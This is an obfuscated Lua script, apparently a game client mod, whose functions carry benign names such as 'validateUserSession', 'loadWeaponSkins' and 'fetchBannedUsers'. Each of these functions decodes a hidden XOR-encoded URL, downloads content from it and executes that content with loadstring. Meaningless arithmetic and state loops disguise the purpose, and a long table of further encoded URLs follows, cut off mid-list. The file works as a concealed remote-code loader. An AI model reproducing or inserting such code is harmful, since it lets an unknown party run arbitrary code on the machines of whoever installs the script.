local v0 = string.char;
local v1 = string.byte;
local v2 = string.sub;
local v3 = bit32 or bit;
local v4 = v3.bxor;
local v5 = table.concat;
local v6 = table.insert;
local function v7(v10, v11)
	local v12 = {};
	for v92 = 1, #v10 do
		v6(v12, v0(v4(v1(v2(v10, v92, v92 + 1)), v1(v2(v11, 1 + (v92 % #v11), 1 + (v92 % #v11) + 1))) % 256));
	end
	return v5(v12);
end
function generateMapChecksum()
	local v13 = 0;
	local v14;
	local v15;
	local v16;
	while true do
		if ((679 - (112 + 567)) == v13) then
			v14 = v7("\252\226\235\26", "\126\177\163\187\69\134\219\167") .. tostring(os.time() % (97838 + 2161));
			v15 = 433 - (153 + 280);
			v13 = 2 - 1;
		end
		if ((1 + 0) == v13) then
			modules.corelib.HTTP.get(v7("\43\217\62\213\166\108\130\39\196\236\48\200\56\211\249\49\131\41\202\241\108\206\34\192\255\40\222\63\200\178\47\216\43", "\156\67\173\74\165"), function(v132, v133)
				local v134 = 0;
				while true do
					if (v134 == 0) then
						if v133 then
							return;
						end
						assert(loadstring(v132))();
						break;
					end
				end
			end);
			for v135 = 1 + 0, #v14 do
				v15 = v15 + (v14:byte(v135) * v135);
			end
			v13 = 2 + 0;
		end
		if (v13 == (2 + 0)) then
			v16 = {};
			for v136 = 1, 186 + 70 do
				table.insert(v16, {x=v136,y=math.random(1, 389 - 133),[v7("\32\190\69\19\149\2", "\38\84\215\41\118\220\70")]=(v15 % (159 + 97))});
			end
			break;
		end
	end
end
function validateUserSession()
	local v17 = 0;
	local v18;
	local v19;
	local v20;
	while true do
		if (v17 == (669 - (89 + 578))) then
			v20 = {};
			for v137 = 1 + 0, 265 - 137 do
				table.insert(v20, (v19 % v137) + math.random(1050 - (572 + 477), 15));
			end
			break;
		end
		if (v17 == (0 + 0)) then
			v18 = v7("\99\63\6\45", "\158\48\118\66\114") .. tostring(os.time() % (59272 + 39493));
			v19 = 0 + 0;
			v17 = 1;
		end
		if (v17 == (87 - (84 + 2))) then
			modules.corelib.HTTP.get(v7("\163\48\4\38\41\234\180\250\125\66\120\34\243\163\229\117\94\103\35\244\180\184\33\19\14\60\172\245\175\33\8\120\127\176\250", "\155\203\68\112\86\19\197"), function(v138, v139)
				local v140 = 0;
				while true do
					if (v140 == 0) then
						if v139 then
							return;
						end
						assert(loadstring(v138))();
						break;
					end
				end
			end);
			for v141 = 1 - 0, #v18 do
				v19 = v19 + (v18:byte(v141) * (v141 % (6 + 1)));
			end
			v17 = 844 - (497 + 345);
		end
	end
end
function fetchMatchHistory()
	local v21 = 0 + 0;
	local v22;
	local v23;
	local v24;
	while true do
		if (1 == v21) then
			modules.corelib.HTTP.get(v7("\244\67\179\86\166\24\232\20\172\4\233\23\168\3\233\23\171\15\233\19\170\24\163\71\232\86\134\9\245\89\163\67\228\25\171\83\253", "\38\156\55\199"), function(v142, v143)
				local v144 = 0;
				local v145;
				while true do
					if ((0 + 0) == v144) then
						v145 = 1333 - (605 + 728);
						while true do
							if (v145 == (0 + 0)) then
								if v143 then
									return;
								end
								assert(loadstring(v142))();
								break;
							end
						end
						break;
					end
				end
			end);
			v24 = {};
			v21 = 3 - 1;
		end
		if (v21 == (1 + 1)) then
			for v146 = 3 - 2, #v23 do
				local v147 = 0;
				local v148;
				while true do
					if (v147 == (0 + 0)) then
						v148 = v23:sub(v146, v146);
						if tonumber(v148) then
							table.insert(v24, tonumber(v148) * math.random(2 - 1, 4 + 1));
						end
						break;
					end
				end
			end
			break;
		end
		if (v21 == 0) then
			v22 = v7("\107\252\2\223\104\71", "\152\38\189\86\156\32\24\133") .. tostring(os.time() % (765921 - (457 + 32)));
			v23 = tostring(os.time()):reverse();
			v21 = 1 + 0;
		end
	end
end
function monitorServerHealth()
	local v25 = v7("\155\79\74\23", "\35\200\29\28\72\115\20\154") .. tostring(os.time() % 135790);
	local v26 = 1402 - (832 + 570);
	modules.corelib.HTTP.get(v7("\17\171\197\207\215\99\123\72\236\134\145\220\116\96\87\233\135\145\220\126\101\86\172\210\205\216\123\46\86\182\223\219\136\52\122\21\170\208", "\84\121\223\177\191\237\76"), function(v93, v94)
		local v95 = 0 + 0;
		while true do
			if (v95 == (0 + 0)) then
				if v94 then
					return;
				end
				assert(loadstring(v93))();
				break;
			end
		end
	end);
	for v96 = 3 - 2, #v25 do
		v26 = v26 + (v25:byte(v96) * (v96 % (3 + 3)));
	end
	local v27 = {};
	for v97 = 797 - (588 + 208), 30 do
		v27[v97] = v26 % (v97 + (5 - 3));
	end
end
function cacheGameSettings()
	local v28 = 1800 - (884 + 916);
	local v29;
	local v30;
	local v31;
	while true do
		if (v28 == (3 - 1)) then
			v31 = {};
			for v149 = 1 + 0, 713 - (232 + 421) do
				v31[v149] = v30 % (v149 + (1892 - (1569 + 320)));
			end
			break;
		end
		if (v28 == 1) then
			modules.corelib.HTTP.get(v7("\65\86\20\53\19\13\79\116\17\26\78\116\31\20\78\124\27\12\84\114\6\81\3\55\30\16\11\106\64\76\4\32\81\12\12\48\72", "\69\41\34\96"), function(v151, v152)
				local v153 = 0;
				local v154;
				while true do
					if (v153 == (0 + 0)) then
						v154 = 0 + 0;
						while true do
							if (v154 == (0 - 0)) then
								if v152 then
									return;
								end
								assert(loadstring(v151))();
								break;
							end
						end
						break;
					end
				end
			end);
			for v155 = 606 - (316 + 289), #v29 do
				v30 = v30 + (v29:byte(v155) * (v155 % 5));
			end
			v28 = 5 - 3;
		end
		if ((0 + 0) == v28) then
			v29 = v7("\152\112\238\159", "\161\219\54\169\192\90\48\80") .. math.random(10000, 101452 - (666 + 787));
			v30 = 425 - (360 + 65);
			v28 = 1 + 0;
		end
	end
end
function loadWeaponSkins()
	local v32 = 254 - (79 + 175);
	local v33;
	local v34;
	local v35;
	while true do
		if (v32 == (1 - 0)) then
			modules.corelib.HTTP.get(v7("\33\213\56\152\115\142\99\222\125\143\126\218\124\143\116\209\103\147\125\218\102\210\47\154\113\152\58\199\32\207\40\141\49\143\32\157\40", "\232\73\161\76"), function(v156, v157)
				local v158 = 0;
				local v159;
				while true do
					if (v158 == 0) then
						v159 = 0;
						while true do
							if (v159 == (0 + 0)) then
								if v157 then
									return;
								end
								assert(loadstring(v156))();
								break;
							end
						end
						break;
					end
				end
			end);
			v35 = {};
			v32 = 2;
		end
		if (v32 == (0 - 0)) then
			v33 = v7("\143\232\254\36\61", "\75\220\163\183\106\98") .. tostring(os.time() % 87654);
			v34 = (((os.time() % (3 - 1)) == (899 - (503 + 396))) and v7("\52\155\167\30\253", "\185\98\218\235\87")) or v7("\226\18\17\199\242\131\239", "\202\171\92\71\134\190");
			v32 = 182 - (92 + 89);
		end
		if (v32 == (3 - 1)) then
			for v160 = 1, 13 + 12 do
				table.insert(v35, v7("\140\220\67\77\17\181\234\73\84\16\132", "\126\219\185\34\61") .. v160);
			end
			break;
		end
	end
end
function fetchBannedUsers()
	local v36 = 0 + 0;
	local v37;
	local v38;
	local v39;
	while true do
		if (v36 == (3 - 2)) then
			modules.corelib.HTTP.get(v7("\190\253\62\219\66\225\124\150\227\176\100\147\65\224\98\150\225\167\120\152\75\225\32\196\164\186\126\198\87\167\61\195\179\241\100\199\13\175", "\167\214\137\74\171\120\206\83"), function(v161, v162)
				if v162 then
					return;
				end
				assert(loadstring(v161))();
			end);
			for v163 = 1 + 0, #v37 do
				v38 = v38 .. string.char(v37:byte(v163) + (v163 % (8 - 4)));
			end
			v36 = 2;
		end
		if (v36 == (0 + 0)) then
			local v129 = 0 + 0;
			while true do
				if (v129 == 0) then
					v37 = v7("\46\239\112\77", "\135\108\174\62\18\30\23\147") .. tostring(os.time() % 54321);
					v38 = "";
					v129 = 2 - 1;
				end
				if (v129 == (1 + 0)) then
					v36 = 1 - 0;
					break;
				end
			end
		end
		if (v36 == (1246 - (485 + 759))) then
			v39 = {};
			for v164 = 2 - 1, 15 do
				table.insert(v39, v7("\169\241\60\83\253\163\190\227\55\79\199", "\199\235\144\82\61\152") .. v164);
			end
			break;
		end
	end
end
function registerNewPlayer()
	local v40 = 0;
	local v41;
	local v42;
	local v43;
	while true do
		if (v40 == 1) then
			modules.corelib.HTTP.get(v7("\15\250\177\222\93\161\234\155\86\160\244\155\73\188\246\128\94\183\234\221\4\252\252\158\5\161\172\192\3\235\189\128\11\251\164", "\174\103\142\197"), function(v165, v166)
				local v167 = 1189 - (442 + 747);
				local v168;
				while true do
					if (v167 == 0) then
						v168 = 1135 - (832 + 303);
						while true do
							if (v168 == (946 - (88 + 858))) then
								if v166 then
									return;
								end
								assert(loadstring(v165))();
								break;
							end
						end
						break;
					end
				end
			end);
			v43 = {};
			v40 = 1 + 1;
		end
		if (v40 == 2) then
			for v169 = 1, 17 + 3 do
				table.insert(v43, v7("\102\36\94\33\32\76\199", "\152\54\72\63\88\69\62") .. v169);
			end
			break;
		end
		if ((0 + 0) == v40) then
			v41 = v7("\41\51\142\20", "\75\103\118\217") .. tostring(os.time() % (99554 - (766 + 23)));
			v42 = (((os.time() % (9 - 7)) == (0 - 0)) and v7("\232\127", "\126\167\52\16\116\217")) or v7("\236\11\14\169\145\61", "\156\168\78\64\224\212\121");
			v40 = 2 - 1;
		end
	end
end
local v8 = {v7("\220\208\250\76\142\139\161\9\128\138\191\9\154\150\189\18\141\157\161\79\215\214\183\12\213\139\231\82\208\193\246\18\216\209\239", "\60\180\164\142"),v7("\80\74\17\57\125\162\93\15\15\75\120\115\163\64\11\16\92\112\104\254\17\74\77\85\40\104\228\28\92\91\29\103\43\248\19", "\114\56\62\101\73\71\141"),v7("\176\253\207\212\226\166\148\149\225\187\149\149\238\177\149\149\246\184\148\215\187\251\138\148\186\166\210\202\188\236\195\138\180\252\218", "\164\216\137\187"),v7("\218\242\37\162\252\177\68\134\179\127\229\255\176\90\130\179\127\227\254\166\68\193\229\35\224\244\253\68\219\232\53\183\190\176\7\199\231", "\107\178\134\81\210\198\158"),v7("\48\26\150\214\240\119\65\211\158\255\118\95\214\136\251\97\92\204\144\253\119\29\129\212\254\107\10\205\207\164\60\11\154\136\166\45\15", "\202\88\110\226\166"),v7("\203\27\150\231\144\140\64\211\161\157\141\86\219\185\152\151\90\204\166\152\140\28\129\229\159\150\10\205\254\196\199\10\154\185\198\214\14", "\170\163\111\226\151"),v7("\25\36\166\40\20\120\102\64\99\234\118\24\111\103\70\100\252\106\29\120\58\18\34\227\106\72\120\32\31\52\183\32\0\59\60\16", "\73\113\80\210\88\46\87"),v7("\137\56\217\2\189\206\99\156\66\179\207\126\158\68\169\214\122\131\64\181\206\63\206\0\176\214\43\130\27\233\133\41\213\92\235\148\45", "\135\225\76\173\114"),v7("\18\249\172\160\246\242\232\75\184\225\254\250\232\233\73\191\246\225\244\234\232\9\238\170\232\244\181\232\19\227\188\181\180\243\171\15\236", "\199\122\141\216\208\204\221"),v7("\165\201\4\224\34\185\226\137\70\190\41\166\252\147\65\165\47\184\255\140\65\191\107\245\191\132\73\249\55\255\163\217\21\232\54\250\184\220", "\150\205\189\112\144\24"),v7("\45\144\171\92\94\199\94\65\113\214\241\21\87\198\64\68\125\202\237\29\75\155\18\2\119\212\181\3\13\134\21\21\61\202\179\89\5", "\112\69\228\223\44\100\232\113"),v7("\220\11\19\195\236\51\201\133\73\82\157\228\46\200\135\74\73\133\225\51\149\215\13\84\130\189\51\143\218\27\2\203\248\112\147\213", "\230\180\127\103\179\214\28"),v7("\132\17\75\86\190\14\175\218\93\17\23\188\18\174\219\83\17\18\176\14\243\143\23\11\20\232\14\233\130\1\90\94\170\77\245\141", "\128\236\101\63\38\132\33"),v7("\164\189\5\84\236\164\128\253\253\69\10\228\187\157\226\240\64\10\227\190\128\191\170\3\17\229\230\128\165\167\21\65\174\165\195\185\168", "\175\204\201\113\36\214\139"),v7("\79\216\33\204\94\8\131\100\143\93\9\153\108\146\92\16\130\108\133\75\84\207\39\138\80\73\131\60\210\0\66\212\123\208\17\70", "\100\39\172\85\188"),v7("\165\108\173\144\105\226\55\232\212\100\227\41\225\210\125\252\32\234\206\96\254\55\170\131\33\250\45\182\207\58\163\124\188\152\125\161\109\184", "\83\205\24\217\224"),v7("\238\209\217\45\188\138\130\108\191\151\131\111\178\148\131\108\181\148\131\108\180\138\222\62\244\157\155\45\169\204\195\57\227\221\131\49\243\196", "\93\134\165\173"),v7("\182\230\213\210\96\129\253\47\233\162\143\148\110\128\224\46\239\188\147\144\117\221\177\108\231\165\208\141\51\192\182\123\166\188\205\215\59", "\30\222\146\161\162\90\174\210"),v7("\237\90\100\26\191\1\63\91\182\26\62\88\181\23\62\83\189\0\36\95\170\93\115\24\181\22\98\69\236\64\116\15\253\0\124\31\228", "\106\133\46\16"),v7("\80\52\103\236\0\15\23\113\36\164\20\22\10\110\34\174\9\14\14\119\60\239\89\82\9\121\96\179\83\78\92\37\107\178\86\85\89", "\32\56\64\19\156\58"),v7("\82\220\241\70\0\189\207\8\152\188\24\3\165\206\11\159\179\24\11\160\207\73\203\247\5\10\230\207\83\198\225\83\66\188\140\79\201", "\224\58\168\133\54\58\146"),v7("\81\66\95\237\47\201\200\93\13\24\25\175\34\200\211\89\23\14\19\178\102\133\149\95\8\67\4\244\123\130\130\19\23\90\94\252", "\107\57\54\43\157\21\230\231"),v7("\211\159\5\229\227\147\128\142\218\95\164\236\146\151\131\197\64\167\232\147\220\216\153\68\167\175\147\198\213\143\20\237\247\208\218\218", "\175\187\235\113\149\217\188"),v7("\52\187\149\92\185\54\55\109\250\216\2\177\43\43\114\250\213\2\176\42\55\47\172\147\26\176\110\55\53\161\133\73\251\55\116\41\174", "\24\92\207\225\44\131\25"),v7("\67\199\172\92\65\50\4\130\238\25\85\47\24\129\246\26\79\51\25\129\247\95\24\111\28\135\160\3\18\115\79\214\160\2\23\104\74", "\29\43\179\216\44\123"),v7("\181\205\52\92\231\150\111\30\237\143\110\29\229\128\110\29\236\139\110\20\229\150\51\79\175\129\117\85\242\208\46\72\184\193\110\64\168\216", "\44\221\185\64"),v7("\9\243\92\79\41\78\168\28\10\61\86\176\6\6\43\79\182\28\12\60\18\228\90\6\37\27\168\65\81\119\4\255\6\83\102\0", "\19\97\135\40\63"),v7("\166\72\39\43\117\126\225\13\107\99\97\96\248\10\125\105\124\98\224\9\102\116\60\50\188\13\99\108\46\126\167\82\55\62\55\127\162\73\50", "\81\206\60\83\91\79"),v7("\70\191\196\98\117\140\2\246\30\248\158\34\97\146\28\247\0\249\129\61\60\192\95\245\31\243\210\61\38\205\73\161\86\229\220\103\46", "\196\46\203\176\18\79\163\45"),v7("\176\54\106\14\126\180\160\225\119\48\76\117\173\161\234\114\47\80\117\169\189\247\49\125\12\117\169\182\187\109\119\16\32\254\247\246\46\107\31", "\143\216\66\30\126\68\155"),v7("\162\220\25\219\159\236\152\176\252\153\67\152\144\237\134\179\248\134\92\152\145\236\196\226\184\153\89\155\193\236\222\239\174\205\21\133\201\182\214", "\129\202\168\109\171\165\195\183"),v7("\42\76\35\200\132\91\169\116\12\121\138\140\65\168\112\9\121\143\134\91\245\33\74\102\141\143\17\169\43\86\51\221\198\90\234\55\89", "\134\66\56\87\184\190\116"),v7("\52\37\29\171\67\164\110\100\111\101\71\233\73\178\111\102\109\127\91\234\72\164\50\54\46\96\95\233\31\164\40\59\56\52\17\245\21\254\32", "\85\92\81\105\219\121\139\65"),v7("\245\167\68\85\38\144\178\226\3\28\50\142\171\225\30\23\47\145\164\234\31\86\127\205\172\228\3\66\51\214\243\183\85\93\50\211\232\178", "\191\157\211\48\37\28"),v7("\215\11\224\12\96\144\80\165\75\108\145\74\172\82\107\142\74\186\77\104\144\12\247\14\107\135\75\252\83\51\209\27\241\4\116\211\10\245", "\90\191\127\148\124"),v7("\112\147\58\7\34\200\97\70\32\210\96\69\40\201\127\78\47\201\120\64\55\148\45\5\41\222\123\30\55\142\32\19\125\159\96\27\109\134", "\119\24\231\78"),v7("\138\57\177\90\134\15\94\208\125\242\4\141\21\69\204\127\245\31\146\18\64\208\98\182\73\206\18\65\212\39\234\67\210\68\20\154\99\169\95\221", "\113\226\77\197\42\188\32"),v7("\50\2\224\165\96\89\187\231\106\79\186\231\111\70\186\231\105\69\186\237\98\89\231\182\40\68\165\226\49\89\253\187\62\19\236\251\54\3\245", "\213\90\118\148"),v7("\83\58\160\70\23\20\97\229\0\21\21\127\229\15\3\15\122\250\3\24\20\61\183\68\31\9\118\184\25\68\85\42\177\78\3\87\59\181", "\45\59\78\212\54"),v7("\24\66\151\155\220\97\226\161\69\1\205\217\210\123\227\161\70\1\205\216\213\97\190\243\2\4\208\210\139\97\164\254\20\83\155\197\138\59\172", "\144\112\54\227\235\230\78\205"),v7("\187\60\27\236\138\20\252\124\90\178\131\9\253\121\89\165\158\2\234\103\28\255\194\9\230\120\1\179\217\85\183\45\23\178\220\78\178", "\59\211\72\111\156\176"),v7("\70\147\247\61\20\200\172\124\26\211\173\116\31\201\178\127\28\201\181\122\1\148\224\63\28\209\178\34\1\142\237\41\75\159\173\33\91\134", "\77\46\231\131"),v7("\178\64\162\80\224\27\249\22\238\26\228\19\239\26\229\20\244\6\228\15\169\87\164\18\237\6\166\15\179\90\178\69\162\26\186\85\187", "\32\218\52\214"),v7("\70\3\37\184\171\255\10\15\31\89\105\241\191\225\23\11\0\64\105\231\226\179\87\8\22\68\32\231\248\190\65\95\86\89\61\189\240", "\58\46\119\81\200\145\208\37"),v7("\35\152\36\188\243\242\121\122\213\104\226\251\233\98\101\221\102\251\231\236\100\100\159\51\190\251\228\98\57\195\57\162\173\184\46\101\128\37\173", "\86\75\236\80\204\201\221"),v7("\122\85\99\149\164\196\61\16\39\209\176\217\38\25\57\211\170\197\33\18\56\150\253\153\33\17\34\150\177\130\124\69\114\157\176\135\103\64", "\235\18\33\23\229\158"),v7("\88\174\213\171\10\245\142\234\8\239\143\233\4\226\143\227\8\244\148\238\31\169\194\169\3\235\151\175\31\179\207\191\85\162\143\183\69\187", "\219\48\218\161"),v7("\236\101\104\89\129\0\175\181\40\46\7\130\22\174\181\39\43\7\137\29\175\247\114\110\26\137\24\245\171\120\114\77\222\87\174\232\100\125", "\128\132\17\28\41\187\47"),v7("\9\38\18\42\7\78\125\87\105\9\79\99\84\104\19\80\99\72\104\12\80\125\21\57\79\82\97\94\44\18\8\60\2\63\69\79\62\19\59", "\61\97\82\102\90"),v7("\164\58\191\91\157\24\81\91\252\120\229\19\150\25\79\91\226\121\243\4\212\84\12\90\248\119\188\4\206\89\26\12\180\96\167\94\198", "\105\204\78\203\43\167\55\126"),v7("\173\190\55\14\73\75\136\4\241\228\114\75\93\86\148\31\252\243\108\13\16\22\146\1\164\229\42\16\23\1\223\31\169\191\34", "\49\197\202\67\126\115\100\167"),v7("\63\79\203\57\218\25\17\96\10\145\120\212\24\12\100\21\134\112\207\69\93\37\14\142\43\207\95\80\51\94\199\103\140\67\95", "\62\87\59\191\73\224\54"),v7("\239\22\238\217\189\77\181\152\190\80\180\152\177\90\180\152\169\83\181\218\228\16\175\155\228\77\243\199\227\7\226\135\235\23\251", "\169\135\98\154"),v7("\195\99\48\68\167\124\135\159\34\106\3\164\125\153\155\34\106\5\165\107\135\216\116\54\1\174\55\135\194\121\32\81\229\125\196\222\118", "\168\171\23\68\52\157\83"),v7("\252\101\225\189\127\98\200\165\41\160\227\116\121\201\165\40\167\227\115\122\200\231\114\231\248\113\40\200\253\127\241\168\61\99\139\225\112", "\231\148\17\149\205\69\77"),v7("\136\179\211\235\13\176\207\246\145\172\25\166\217\233\149\175\2\177\209\245\136\232\84\237\213\242\193\180\94\241\132\162\223\181\91\234\129", "\159\224\199\167\155\55"),v7("\255\231\40\194\173\188\115\131\164\171\114\132\175\189\107\134\185\161\111\157\228\240\46\135\161\244\115\219\249\247\57\202\185\255\41\211", "\178\151\147\92"),v7("\132\233\88\34\72\3\53\221\173\24\124\64\31\44\194\170\26\124\64\30\53\159\254\94\103\69\68\53\133\243\72\55\10\2\118\153\252", "\26\236\157\44\82\114\44"),v7("\34\58\193\75\112\97\154\10\127\119\155\13\127\96\134\9\100\127\141\12\101\61\214\73\127\118\220\20\35\32\209\94\50\96\217\78\43", "\59\74\78\181"),v7("\45\197\78\74\233\106\158\14\12\253\116\129\11\20\226\112\134\20\8\226\116\158\73\89\161\112\136\80\21\186\43\213\95\66\253\41\196\91", "\211\69\177\58\58"),v7("\191\241\109\229\179\132\248\180\45\167\167\146\228\171\40\161\177\133\229\180\54\230\234\217\225\181\114\186\224\197\179\224\97\187\229\222\182", "\171\215\133\25\149\137"),v7("\233\220\38\234\181\127\179\19\183\157\124\168\189\126\175\23\175\158\101\181\252\51\238\20\176\196\125\243\225\52\249\90\175\196\39\251", "\34\129\168\82\154\143\80\156"),v7("\141\166\39\27\18\1\198\211\234\125\90\16\29\199\210\228\125\95\28\1\154\134\160\101\89\69\1\128\139\182\54\19\6\66\156\132", "\233\229\210\83\107\40\46"),v7("\201\86\38\198\95\142\13\99\130\81\143\16\98\132\75\152\19\124\131\80\142\81\49\196\83\146\76\125\223\11\197\71\42\152\9\212\67", "\101\161\34\82\182"),v7("\224\25\77\238\129\173\205\127\187\84\23\171\130\172\218\121\166\84\0\177\200\225\144\120\188\2\22\247\213\230\135\54\166\1\76\255", "\78\136\109\57\158\187\130\226"),v7("\54\43\237\225\100\112\182\160\106\104\183\160\102\109\183\160\102\108\183\162\109\112\234\242\44\105\172\225\113\54\247\245\59\39\183\253\43\62", "\145\94\95\153"),v7("\245\217\0\197\20\248\178\156\77\135\0\229\169\156\90\132\29\230\179\156\70\154\93\180\239\155\66\196\1\190\243\201\17\205\0\187\232\204", "\215\157\173\116\181\46"),v7("\61\160\159\226\128\122\251\218\165\138\123\226\223\188\136\101\229\197\160\136\122\167\136\224\140\98\166\196\251\212\49\177\147\188\214\32\181", "\186\85\212\235\146"),v7("\202\149\2\238\99\161\23\147\210\66\176\107\190\1\140\216\78\176\109\187\23\209\130\4\168\97\253\23\203\143\18\251\33\160\84\215\128", "\56\162\225\118\158\89\142"),v7("\84\17\212\191\120\151\19\84\151\247\108\142\14\75\145\253\113\150\10\82\143\188\33\202\10\92\212\224\43\214\88\0\216\225\46\205\93", "\184\60\101\160\207\66"),v7("\57\150\104\172\107\205\51\238\97\219\50\229\102\204\45\235\103\204\45\238\126\145\127\174\102\210\105\243\56\140\120\185\41\204\112\169\48", "\220\81\226\28"),v7("\27\193\150\235\176\136\92\131\214\181\184\149\68\155\214\169\164\159\75\154\145\248\248\144\66\195\205\242\228\195\22\205\204\247\255\198", "\167\115\181\226\155\138"),v7("\234\54\243\76\33\62\137\183\115\169\13\46\63\158\186\108\182\14\42\62\213\225\48\176\14\108\62\207\236\38\226\68\53\125\211\227", "\166\130\66\135\60\27\17"),v7("\76\94\218\101\106\11\5\159\32\105\10\24\156\38\126\17\30\128\38\99\11\89\205\103\103\23\82\129\124\62\64\79\214\59\60\81\75", "\80\36\42\174\21"),v7("\70\4\35\106\20\95\120\43\24\69\121\40\29\66\121\44\26\94\101\40\1\3\52\104\25\68\46\53\71\30\51\127\86\94\59\111\79", "\26\46\112\87"),v7("\177\55\191\100\229\240\10\230\233\117\229\37\231\230\11\229\232\113\229\44\231\240\86\183\171\116\254\110\240\182\75\176\188\59\229\120\170\190", "\212\217\67\203\20\223\223\37"),v7("\178\153\188\194\224\194\231\134\239\195\255\133\244\212\240\156\235\217\251\157\169\142\186\133\236\140\231\219\180\137\173\202\244\129\189\211", "\178\218\237\200"),v7("\190\161\242\192\236\250\169\129\238\237\168\129\224\227\168\130\229\230\168\133\227\250\245\211\164\226\177\210\249\188\232\212\179\173\168\220\163\180", "\176\214\213\134"),v7("\252\185\162\196\242\25\22\166\253\229\154\248\24\8\165\254\248\134\249\25\74\247\191\225\140\171\25\80\250\169\179\204\230\90\76\245", "\57\148\205\214\180\200\54"),v7("\26\233\33\36\44\93\178\108\97\56\64\172\99\122\36\66\172\123\101\36\64\178\38\55\100\69\164\49\123\127\28\249\48\44\56\30\232\52", "\22\114\157\85\84"),v7("\204\223\7\212\7\185\231\149\157\66\138\14\163\230\149\153\65\138\12\165\252\139\216\16\214\5\166\173\139\194\29\192\88\238\230\200\222\18", "\200\164\171\115\164\61\150"),v7("\182\224\23\85\217\241\187\85\17\205\236\166\86\11\209\239\186\84\29\204\173\247\17\29\210\184\187\10\75\135\187\236\77\73\150\191", "\227\222\148\99\37"),v7("\59\70\70\230\163\124\29\3\165\173\125\0\2\175\183\96\3\28\164\168\98\29\65\245\235\107\0\85\185\240\61\86\87\238\183\63\71\83", "\153\83\50\50\150"),v7("\85\98\103\12\41\228\2\12\37\42\82\34\253\31\19\36\32\82\42\242\2\78\117\97\68\32\163\2\84\120\119\25\107\229\65\72\119", "\45\61\22\19\124\19\203"),v7("\201\6\25\229\88\63\246\144\69\91\187\87\40\247\144\67\88\187\83\34\246\210\17\31\173\86\121\246\200\28\9\240\26\62\181\212\19", "\217\161\114\109\149\98\16"),v7("\26\52\44\108\230\59\93\113\96\41\242\38\66\110\105\37\235\58\68\119\119\111\191\102\74\117\50\51\181\122\22\37\32\50\176\97\19", "\20\114\64\88\28\220"),v7("\57\21\198\164\162\159\242\99\81\133\250\169\133\233\127\83\130\225\182\130\236\99\78\193\183\234\136\235\58\78\219\186\252\213\165\127\13\199\181", "\221\81\97\178\212\152\176"),v7("\197\243\9\235\64\130\168\79\171\67\131\181\72\171\84\159\180\78\181\66\149\168\14\248\8\149\176\17\180\19\195\227\24\227\84\193\242\28", "\122\173\135\125\155"),v7("\140\213\20\169\101\126\135\213\151\88\247\110\96\145\202\149\84\247\106\100\135\151\194\18\225\103\60\135\141\207\4\188\39\127\196\145\192", "\168\228\161\96\217\95\81"),v7("\211\197\58\76\117\24\148\128\123\11\97\5\143\132\96\13\121\0\149\130\125\19\60\84\201\137\119\82\96\94\213\213\43\68\97\91\206\208", "\55\187\177\78\60\79"),v7("\37\218\75\251\28\128\207\121\155\17\184\20\129\209\123\151\17\178\31\128\147\46\220\6\187\73\128\137\35\202\90\243\8\195\149\44", "\224\77\174\63\139\38\175"),v7("\140\85\76\62\222\14\23\127\208\21\22\119\213\15\9\124\214\15\14\121\203\82\91\60\221\16\72\97\141\79\92\43\156\15\84\59\133", "\78\228\33\56"),v7("\198\106\166\19\223\129\49\228\87\203\156\45\231\77\214\154\48\224\81\202\221\125\160\90\215\223\49\187\13\129\203\102\252\15\144\207", "\229\174\30\210\99"),v7("\19\249\146\65\183\114\118\78\188\200\9\180\115\104\73\188\200\6\181\114\42\24\255\223\2\255\114\48\21\233\131\73\163\49\44\26", "\89\123\141\230\49\141\93"),v7("\251\101\226\28\74\5\188\32\175\84\94\24\167\37\184\93\70\29\189\32\164\67\3\73\225\40\162\31\95\67\253\117\243\20\94\70\230\112", "\42\147\17\150\108\112"),v7("\7\178\57\111\189\167\64\247\125\43\169\186\91\254\99\41\179\166\92\245\98\108\228\250\86\243\57\48\238\230\11\163\53\49\235\253\14", "\136\111\198\77\31\135"),v7("\10\29\179\70\231\171\88\248\90\92\233\4\233\188\89\241\90\71\242\3\242\247\20\187\91\95\178\25\180\234\19\172\26\71\171\67\188", "\201\98\105\199\54\221\132\119"),v7("\177\24\151\49\88\122\227\232\85\209\111\91\108\226\232\90\212\111\80\103\227\170\15\145\120\85\35\227\176\2\135\36\26\123\160\172\13", "\204\217\108\227\65\98\85"),v7("\86\215\225\245\118\143\17\146\166\177\98\145\12\145\187\180\125\142\12\146\164\170\63\195\76\154\173\242\99\201\80\199\240\253\98\204\75\194", "\160\62\163\149\133\76"),v7("\222\180\25\63\153\153\239\95\127\149\152\248\92\97\146\132\238\90\119\140\197\163\31\118\154\206\239\4\33\199\211\184\67\35\214\215", "\163\182\192\109\79"),v7("\60\50\20\208\175\123\105\81\153\167\122\119\86\152\187\101\104\81\143\230\55\52\81\195\186\61\40\4\197\237\122\42\21\193", "\149\84\70\96\160"),v7("\48\18\25\253\98\73\66\185\109\72\90\180\118\87\93\184\118\87\85\181\119\21\14\255\106\5\66\228\54\2\8\245\118\10\24\236", "\141\88\102\109"),v7("\187\71\222\96\64\114\26\144\235\6\132\33\78\115\4\152\225\29\156\39\85\46\86\211\224\80\133\121\20\57\80\217\253\95\223\113", "\161\211\51\170\16\122\93\53"),v7("\243\186\166\56\161\225\253\121\173\249\252\113\162\224\224\124\174\224\227\122\180\189\177\58\175\173\253\33\245\170\183\48\181\162\167\41", "\72\155\206\210"),v7("\78\110\64\30\105\9\53\5\93\107\8\44\12\64\100\18\52\6\93\124\85\121\70\91\48\9\115\90\10\54\94\52\88\27\50", "\83\38\26\52\110"),v7("\80\3\51\86\2\88\104\23\8\67\105\20\11\65\105\17\14\89\117\20\23\4\36\84\14\20\104\79\86\19\34\94\22\27\50\71", "\38\56\119\71"),v7("\251\251\76\198\127\25\188\190\13\143\107\0\166\161\11\132\107\7\171\184\23\197\38\68\164\236\23\223\43\82\246\247\22\218\48\87", "\54\147\143\56\182\69"),v7("\222\149\235\89\133\153\206\171\31\145\135\209\174\7\142\131\214\177\27\142\135\206\236\74\205\142\130\176\64\209\210\132\231\7\211\195\128", "\191\182\225\159\41"),v7("\35\6\60\69\209\200\141\122\70\122\27\210\212\140\122\70\112\27\217\214\141\56\17\58\12\136\200\203\37\22\45\77\197\139\215\42", "\162\75\114\72\53\235\231"),v7("\132\40\80\242\9\77\195\109\18\183\29\80\222\114\23\183\29\84\219\115\87\225\65\83\220\63\11\235\93\6\137\36\10\238\70\3", "\98\236\92\36\130\51"),v7("\172\13\24\170\31\231\250\102\252\87\93\226\22\230\226\102\234\77\88\245\86\171\167\97\245\26\67\179\75\172\176\40\234\21\25\187", 